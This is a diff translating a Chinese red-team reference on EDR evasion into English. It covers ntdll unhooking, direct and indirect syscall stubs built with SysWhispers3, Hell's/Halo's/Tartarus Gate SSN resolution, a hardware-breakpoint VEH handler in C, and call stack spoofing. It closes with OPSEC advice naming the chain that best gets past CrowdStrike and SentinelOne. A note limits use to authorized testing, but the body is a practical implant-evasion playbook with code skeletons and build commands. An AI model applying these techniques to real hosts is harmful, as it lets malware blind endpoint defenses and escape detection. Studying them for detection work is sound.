@@ -1,64 +1,64 @@
-# Unhook / 直接 / 间接 syscall 技术清单
+# Unhook / Direct / Indirect Syscall Technique Inventory
 
-> 仅限授权红队 / 对抗演练 / 自有产品测试，禁止用于未授权目标。
+> Authorized red teaming / adversary emulation / own-product testing only; use against unauthorized targets is forbidden.
 
-本文档汇总当前主流的"绕过用户态 hook"技术，从最经典的 unhook 到最新的 hardware breakpoint Blindside。
-所有技术都对照 MITRE ATT&CK T1562.001 / T1027 / T1055，便于报告输出。
+This document consolidates the current mainstream "user-mode hook bypass" techniques, from the classic unhook to the latest hardware breakpoint Blindside.
+All techniques are mapped to MITRE ATT&CK T1562.001 / T1027 / T1055 for easy report output.
 
 ## 1. Peruns Fart / Fresh Ntdll from disk
 
-### 原理
+### Principle
 
-EDR 的 hook 全部位于 **当前进程内存中的 ntdll.dll**。磁盘上 `C:\Windows\System32\ntdll.dll` 是干净的。
-所以只要把磁盘 ntdll 重新映射进当前进程并覆盖内存中的 `.text` 段，hook 就被擦掉。
+An EDR's hooks all live in **ntdll.dll in the current process's memory**. The on-disk `C:\Windows\System32\ntdll.dll` is clean.
+So if you re-map the on-disk ntdll into the current process and overwrite the in-memory `.text` section, the hooks get wiped.
 
 ```text
-当前进程 ntdll.dll (RWX)
+Current process ntdll.dll (RWX)
   ┌─────────────────────────┐
-  │ .text (含 EDR hook jmp) │ ◄── 用磁盘干净 .text 覆盖
+  │ .text (with EDR hook jmps) │ ◄── overwrite with the clean .text from disk
   └─────────────────────────┘
         ▲
         │ NtMapViewOfSection(disk_ntdll)
         │
-  磁盘 C:\Windows\System32\ntdll.dll  ← 干净
+  Disk C:\Windows\System32\ntdll.dll  ← clean
 ```
 
-### 实现要点
+### Implementation Essentials
 
 ```c
-// 步骤：
-// 1. CreateFileW("\\Device\\HarddiskVolumeX\\Windows\\System32\\ntdll.dll")  // 用原生路径绕监控
+// Steps:
+// 1. CreateFileW("\\Device\\HarddiskVolumeX\\Windows\\System32\\ntdll.dll")  // native path to evade monitoring
 // 2. NtCreateSection (SEC_IMAGE)
-// 3. NtMapViewOfSection 到一个新地址
-// 4. 找新地址 .text 段
-// 5. NtProtectVirtualMemory 把当前 ntdll .text 改 RW
-// 6. memcpy 覆盖
-// 7. NtProtectVirtualMemory 还原为 RX
+// 3. NtMapViewOfSection at a new address
+// 4. Find the .text section at the new address
+// 5. NtProtectVirtualMemory to make the current ntdll .text RW
+// 6. memcpy overwrite
+// 7. NtProtectVirtualMemory to restore RX
 ```
 
-### 注意
+### Notes
 
-- `NtProtectVirtualMemory` 本身可能就是 hook 的 → 链式问题。解决：先用 **直接 syscall** 调 `NtProtectVirtualMemory`
-- 现代 EDR 已经监控 `NtProtectVirtualMemory` 对 ntdll 内存的 W 操作，需要配合 ETW patch
-- Peruns Fart 在 ETW-TI 下会留下事件 `KERNEL_MODULE_LOAD`、`PROTECTVM` — 一定要先压 ETW
+- `NtProtectVirtualMemory` itself may be hooked → chained problem. Solution: call `NtProtectVirtualMemory` first via **direct syscall**
+- Modern EDRs already monitor W operations by `NtProtectVirtualMemory` on ntdll memory — pair with an ETW patch
+- Peruns Fart leaves `KERNEL_MODULE_LOAD`, `PROTECTVM` events under ETW-TI — ETW must be suppressed first
 
-## 2. 直接 syscall (Direct Syscall)
+## 2. Direct Syscall
 
-### 原理
+### Principle
 
-不调用 ntdll 的导出函数，自己写 syscall stub：
+Instead of calling ntdll's exported functions, write your own syscall stub:
 
 ```asm
 NtAllocateVirtualMemory:
     mov r10, rcx
-    mov eax, 0x18      ; SSN (Win11 24H2 上的值，每个版本不同)
+    mov eax, 0x18      ; SSN (value on Win11 24H2; differs per version)
     syscall
     ret
 ```
 
-`syscall` 指令直接从用户态跳到内核 SSDT，跳过任何用户态 hook。
+The `syscall` instruction jumps straight from user mode to the kernel SSDT, skipping any user-mode hook.
 
-### SysWhispers3 用法
+### SysWhispers3 Usage
 
 ```powershell
 git clone https://github.com/klezVirus/SysWhispers3
@@ -66,34 +66,34 @@ cd SysWhispers3
 python3 syswhispers.py --preset all --action edit -o syscalls
 ```
 
-输出：
+Output:
 
 ```text
-syscalls.h    - 函数声明
-syscalls.c    - C 胶水代码
-syscalls.asm  - MASM 汇编 stub
-syscallsstubs.std.x64.asm  - 标准直接 syscall
+syscalls.h    - function declarations
+syscalls.c    - C glue code
+syscalls.asm  - MASM assembly stubs
+syscallsstubs.std.x64.asm  - standard direct syscalls
 ```
 
-在 Visual Studio 中：
+In Visual Studio:
 
 ```text
-1. 把 .asm 加入项目，启用 MASM (Custom Build Tool)
+1. Add the .asm to the project, enable MASM (Custom Build Tool)
 2. include syscalls.h
-3. 调用 Sw3NtAllocateVirtualMemory(...) 替换原 NtAllocateVirtualMemory
+3. Call Sw3NtAllocateVirtualMemory(...) replacing the original NtAllocateVirtualMemory
 ```
 
-### 最小直接 syscall 调 NtCreateFile（C 代码骨架）
+### Minimal direct syscall calling NtCreateFile (C code skeleton)
 
 ```c
-// syscalls.asm（节选）
+// syscalls.asm (excerpt)
 // Sw3NtCreateFile PROC
 //     mov [rsp +8], rcx
 //     mov [rsp+16], rdx
 //     mov [rsp+24], r8
 //     mov [rsp+32], r9
 //     sub rsp, 28h
-//     mov ecx, 0x55           ; function hash (动态解析 SSN)
+//     mov ecx, 0x55           ; function hash (dynamic SSN resolution)
 //     call Sw3GetSyscallNumber
 //     add rsp, 28h
 //     mov rcx, [rsp+8]
@@ -136,7 +136,7 @@ int main(void) {
     );
 
     if (st >= 0) {
-        // 写一些字节略
+        // write some bytes — omitted
         Sw3NtClose(hFile);
         return 0;
     }
@@ -144,123 +144,123 @@ int main(void) {
 }
 ```
 
-### 缺点
+### Drawbacks
 
-- syscall 指令位于 implant 自己的 `.text` 段（非 ntdll 内）→ kernel-mode telemetry 容易看出 "syscall from non-ntdll address"
-- 这就是 indirect syscall 出现的原因
+- The syscall instruction lives in the implant's own `.text` section (not inside ntdll) → kernel-mode telemetry can easily spot "syscall from non-ntdll address"
+- That is why indirect syscalls exist
 
-## 3. 间接 syscall (Indirect Syscall)
+## 3. Indirect Syscall
 
-### 原理
+### Principle
 
-syscall 指令仍然来自 ntdll.dll（合法地址），只是 SSN 和返回地址我们自己控制：
+The syscall instruction still comes from ntdll.dll (a legitimate address); only the SSN and return address are under our control:
 
 ```text
-implant 代码：
+Implant code:
     mov r10, rcx
     mov eax, <SSN>
-    jmp [<ntdll 中某个 syscall;ret gadget 的地址>]   ; 不是 syscall 在 implant 里
+    jmp [<address of some syscall;ret gadget inside ntdll>]   ; the syscall is not in the implant
 ```
 
-跳到的 gadget 通常就是 `Nt*` 函数末尾的 `syscall; ret` 两字节序列。
-kernel-mode ETW provider 看到的 RIP 是 ntdll 地址，符合合法行为模式。
+The gadget jumped to is usually the `syscall; ret` two-byte sequence at the end of an `Nt*` function.
+The RIP seen by the kernel-mode ETW provider is an ntdll address, matching a legitimate behavior pattern.
 
-### SysWhispers3 indirect 模式
+### SysWhispers3 indirect mode
 
 ```powershell
 python3 syswhispers.py --preset all --action edit --mode jumper -o syscalls
 # --mode jumper            => indirect syscall
-# --mode jumper_randomized => 随机化 jmp 目标减少签名
+# --mode jumper_randomized => randomize the jmp target to reduce signatures
 ```
 
-生成的 stub：
+Generated stub:
 
 ```asm
 Sw3NtAllocateVirtualMemory PROC
     mov [rsp+8], rcx
     ...
     mov ecx, 0x18                  ; function hash
-    call Sw3GetSyscallNumber       ; 返回 SSN -> eax
-    call Sw3GetSyscallAddress      ; 返回 ntdll 中 syscall;ret 地址 -> rbx
+    call Sw3GetSyscallNumber       ; returns SSN -> eax
+    call Sw3GetSyscallAddress      ; returns the syscall;ret address in ntdll -> rbx
     ...
     mov r10, rcx
-    jmp rbx                        ; 跳到 ntdll 内合法 syscall 指令
+    jmp rbx                        ; jump to the legitimate syscall instruction inside ntdll
 Sw3NtAllocateVirtualMemory ENDP
 ```
 
 ## 4. Hell's Gate / Halo's Gate / Tartarus Gate
 
-三者解决"SSN 动态解析"的演进。
+The three are an evolution solving "dynamic SSN resolution".
 
 ### Hell's Gate
 
-- 假设 ntdll 未被 hook
-- 在 implant 启动时遍历 ntdll 的 `Nt*` 导出，从前 4 字节 `mov eax, <SSN>` 提取 SSN
-- 优点：不写死 SSN，跨 Windows 版本通用
-- 缺点：如果 ntdll 已经被 hook（第一字节变成 jmp），提取失败
+- Assumes ntdll is not hooked
+- At implant startup, walks ntdll's `Nt*` exports and extracts the SSN from the first 4 bytes `mov eax, <SSN>`
+- Advantage: no hardcoded SSN, portable across Windows versions
+- Drawback: extraction fails if ntdll is already hooked (first bytes replaced by a jmp)
 
 ### Halo's Gate
 
-- 修复 Hell's Gate 的 hook 问题
-- 如果发现某个函数被 hook（不是标准 prologue），就**向上 / 向下扫描 ±N 个函数**
-- 利用 ntdll 中 `Nt*` 函数 SSN 是连续递增的事实，从邻居反推被 hook 函数的 SSN
+- Fixes Hell's Gate's hook problem
+- If a function is found hooked (non-standard prologue), **scan ±N neighboring functions up/down**
+- Exploits the fact that SSNs of `Nt*` functions in ntdll are consecutive and increasing, deriving the hooked function's SSN from its neighbors
 
 ```text
-正常情况：
+Normal case:
   NtAllocateVirtualMemory  SSN = 0x18
   NtQueryInformationProcess SSN = 0x19
   NtProtectVirtualMemory    SSN = 0x50
 
-如果 NtAllocateVirtualMemory 被 hook 看不到 SSN，看邻居：
-  上一个未 hook 的导出 SSN = 0x17
-  下一个未 hook 的导出 SSN = 0x19
+If NtAllocateVirtualMemory is hooked and the SSN is invisible, look at the neighbors:
+  Previous unhooked export SSN = 0x17
+  Next unhooked export SSN = 0x19
   → NtAllocateVirtualMemory SSN = 0x18
 ```
 
 ### Tartarus Gate
 
-- 进一步处理 **Hook 改了 SSN 但保留了 syscall 指令** 的高级 hook
-- 同时校验 SSN 与 syscall;ret gadget 地址
-- 三者结合提供最稳定的 indirect syscall 基础
+- Further handles advanced hooks that **change the SSN but keep the syscall instruction**
+- Validates both the SSN and the syscall;ret gadget address
+- The three combined provide the most stable indirect syscall foundation
 
-### 参考实现位置（在自举的 git clone 后）
+### Reference implementation locations (after the bootstrapped git clone)
 
 ```text
 Hell's Gate:    am0nsec/HellsGate
-Halo's Gate:    am0nsec/HellsGate (含 fallback 逻辑) / SafeBreach-Labs/HalosGate-PoC
+Halo's Gate:    am0nsec/HellsGate (includes fallback logic) / SafeBreach-Labs/HalosGate-PoC
 Tartarus Gate:  trickster0/TartarusGate
-SysWhispers3:   集成了三者
+SysWhispers3:   integrates all three
 ```
 
 ## 5. Hardware Breakpoint Blindside
 
-### 原理
+### Principle
 
-利用调试寄存器 `DR0-DR3` 在 EDR hook trampoline 的入口设硬件断点；
-设置 VEH (Vectored Exception Handler) 在断点命中时把 RIP **直接改到 hook trampoline 后面**，
-跳过 EDR 的检测代码，落到 ntdll 真正的 syscall 段。
+Use debug registers `DR0-DR3` to set a hardware breakpoint at the entry of an EDR hook trampoline;
+install a VEH (Vectored Exception Handler) so that when the breakpoint hits, RIP is **redirected straight past the hook trampoline**,
+skipping the EDR's detection code and landing on ntdll's real syscall section.
 
-### 优势
+### Advantages
 
-- 不需要写 ntdll 内存（无 `NtProtectVirtualMemory` 告警）
-- 不需要 unhook（hook 还在那，只是被绕过）
-- ETW-TI 看不到内存修改
+- No need to write to ntdll memory (no `NtProtectVirtualMemory` alert)
+- No need to unhook (the hook is still there, just bypassed)
+- ETW-TI sees no memory modification
 
-### 实现骨架
+### Implementation Skeleton
 
 ```c
 // 1. AddVectoredExceptionHandler
-// 2. 在每个被 hook 函数入口设 DR0..DR3 (最多 4 个，配合 single-step rotate)
-// 3. SetThreadContext(thread, &ctx) 写 DRx
-// 4. 当 EDR hook trampoline 触发硬件断点 -> VEH 接管
-// 5. VEH 把 EXCEPTION_POINTERS->ContextRecord->Rip 改到 ntdll 的合法 syscall;ret
+// 2. Set DR0..DR3 at each hooked function entry (max 4; combine with single-step rotation)
+// 3. SetThreadContext(thread, &ctx) to write DRx
+// 4. When the EDR hook trampoline triggers the hardware breakpoint -> the VEH takes over
+// 5. The VEH changes EXCEPTION_POINTERS->ContextRecord->Rip to ntdll's legitimate syscall;ret
 // 6. ContinueExecution
 
 LONG CALLBACK Blindside(EXCEPTION_POINTERS* ep) {
     if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
         DWORD64 rip = ep->ContextRecord->Rip;
         if (rip == g_hookedNtAllocVM) {
-            // SSN 已经在 eax；R10 = RCX；跳到 ntdll 的 syscall;ret
+            // SSN already in eax; R10 = RCX; jump to ntdll's syscall;ret
             ep->ContextRecord->Rip = (DWORD64)g_syscallGadget;
             return EXCEPTION_CONTINUE_EXECUTION;
         }
@@ -269,70 +269,70 @@ LONG CALLBACK Blindside(EXCEPTION_POINTERS* ep) {
 }
 ```
 
-### 限制
+### Limitations
 
-- 每个线程独立 DRx → 多线程要分别设
-- 一些 EDR 已经 hook `NtSetContextThread` / `NtGetContextThread`，要先用前面的技术绕过它
-- Win11 22H2+ 引入 HVCI / 一些反调试缓解可能干扰
+- DRx is per-thread → multithreaded implants must set them individually
+- Some EDRs already hook `NtSetContextThread` / `NtGetContextThread`; bypass that first with the earlier techniques
+- Win11 22H2+ introduced HVCI / some anti-debug mitigations may interfere
 
 ## 6. Call Stack Spoofing
 
-### 问题
+### The Problem
 
-现代 EDR 在 `NtAllocateVirtualMemory` / `NtCreateThreadEx` 等 syscall 内核入口处会调用 `RtlCaptureStackBackTrace`，
-拿到完整调用栈上报。implant 的栈会出现 **non-image-backed memory** 帧 → 高置信告警。
+Modern EDRs call `RtlCaptureStackBackTrace` at the kernel entry of syscalls like `NtAllocateVirtualMemory` / `NtCreateThreadEx`,
+capturing and reporting the full call stack. The implant's stack will show **non-image-backed memory** frames → high-confidence alert.
 
-### 方案 A：CallStackSpoofer（William Burgess）
+### Option A: CallStackSpoofer (William Burgess)
 
-实现思路：
+Implementation idea:
 
-1. 在 syscall 前 swap 当前线程栈 → 一个伪造的合法栈
-2. 伪造的栈帧填充诸如 `kernel32!BaseThreadInitThunk → ntdll!RtlUserThreadStart` 这种全合法返回链
-3. syscall 返回后 swap 回真实栈
+1. Before the syscall, swap the current thread's stack → a spoofed legitimate stack
+2. Fill the fake stack frames with an entirely legitimate return chain such as `kernel32!BaseThreadInitThunk → ntdll!RtlUserThreadStart`
+3. After the syscall returns, swap back to the real stack
 
-### 方案 B：SilentMoonwalk
+### Option B: SilentMoonwalk
 
-更激进，使用 desynchronized stack：
+More aggressive, uses a desynchronized stack:
 
 ```text
-执行流程：
-  implant 代码  →  自定义 trampoline (修改 RSP / RBP / 栈内容)
+Execution flow:
+  implant code  →  custom trampoline (modifies RSP / RBP / stack contents)
                 ↓
-                syscall (RtlCaptureStackBackTrace 看到伪造栈)
+                syscall (RtlCaptureStackBackTrace sees the spoofed stack)
                 ↓
-                trampoline 还原 → 继续 implant 代码
+                trampoline restores → implant code continues
 ```
 
-关键是 unwinding：让 `RtlVirtualUnwind` 走入伪造的 `RUNTIME_FUNCTION` / `UNWIND_INFO` 链。
+The key is unwinding: make `RtlVirtualUnwind` walk into a forged `RUNTIME_FUNCTION` / `UNWIND_INFO` chain.
 
-### 实战 OPSEC 建议
+### Practical OPSEC Advice
 
-- call stack spoof + indirect syscall + ETW patch 是当前过 CrowdStrike / SentinelOne 比较稳的组合
-- 在 sleep 阶段也要 spoof，单纯执行时 spoof 是不够的（EDR 会定期采样）
+- Call stack spoof + indirect syscall + ETW patch is currently the most reliable combination for getting past CrowdStrike / SentinelOne
+- Spoof during the sleep phase too — spoofing only during execution is not enough (EDRs sample periodically)
 
-## 7. 技术选型对照表
+## 7. Technique Selection Matrix
 
-| 技术 | 对抗 | 复杂度 | 当前有效性 | ATT&CK |
+| Technique | Counters | Complexity | Current Effectiveness | ATT&CK |
 |------|------|--------|------------|--------|
-| Peruns Fart | 用户态 hook | 低 | 中（易被 ETW 抓） | T1562.001 |
-| Direct syscall (SysWhispers) | 用户态 hook | 低 | 低-中（kernel 看 RIP 在 implant） | T1106 / T1562.001 |
-| Indirect syscall (jumper) | 用户态 hook + kernel RIP 检测 | 中 | 中-高 | T1106 |
-| Hell's / Halo's / Tartarus | SSN 解析 | 中 | 高（基础设施） | T1027 |
-| HWBP Blindside | hook + 无写操作 | 高 | 高 | T1562.001 |
-| CallStackSpoofer / SilentMoonwalk | call stack telemetry | 高 | 高 | T1564 |
+| Peruns Fart | user-mode hooks | low | medium (easily caught by ETW) | T1562.001 |
+| Direct syscall (SysWhispers) | user-mode hooks | low | low-medium (kernel sees RIP in the implant) | T1106 / T1562.001 |
+| Indirect syscall (jumper) | user-mode hooks + kernel RIP checks | medium | medium-high | T1106 |
+| Hell's / Halo's / Tartarus | SSN resolution | medium | high (infrastructure) | T1027 |
+| HWBP Blindside | hooks + write-free | high | high | T1562.001 |
+| CallStackSpoofer / SilentMoonwalk | call stack telemetry | high | high | T1564 |
 
-实战推荐链：**Halo's Gate + indirect syscall + CallStackSpoofer + ETW patch**。
+Recommended practical chain: **Halo's Gate + indirect syscall + CallStackSpoofer + ETW patch**.
 
-## 参考资料
+## References
 
-- SysWhispers3：<https://github.com/klezVirus/SysWhispers3>
-- Hell's Gate / Halo's Gate POC：<https://github.com/am0nsec/HellsGate>、<https://github.com/SafeBreach-Labs/HalosGate-PoC>
-- Tartarus Gate：<https://github.com/trickster0/TartarusGate>
-- CallStackSpoofer：<https://github.com/WithSecureLabs/CallStackSpoofer>
-- SilentMoonwalk：<https://github.com/klezVirus/SilentMoonwalk>
-- Blindside（hardware breakpoint）：<https://www.cyberark.com/resources/threat-research-blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints>
-- MITRE T1562.001：<https://attack.mitre.org/techniques/T1562/001/>
+- SysWhispers3: <https://github.com/klezVirus/SysWhispers3>
+- Hell's Gate / Halo's Gate POC: <https://github.com/am0nsec/HellsGate>, <https://github.com/SafeBreach-Labs/HalosGate-PoC>
+- Tartarus Gate: <https://github.com/trickster0/TartarusGate>
+- CallStackSpoofer: <https://github.com/WithSecureLabs/CallStackSpoofer>
+- SilentMoonwalk: <https://github.com/klezVirus/SilentMoonwalk>
+- Blindside (hardware breakpoint): <https://www.cyberark.com/resources/threat-research-blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints>
+- MITRE T1562.001: <https://attack.mitre.org/techniques/T1562/001/>
 
-## 路由回调
+## Routing Callback
 
-unhook 仅是绕过的一半，另一半是 telemetry 失明：进入 `references/telemetry-blinding.md`。
+Unhooking is only half the bypass; the other half is blinding telemetry: proceed to `references/telemetry-blinding.md`.
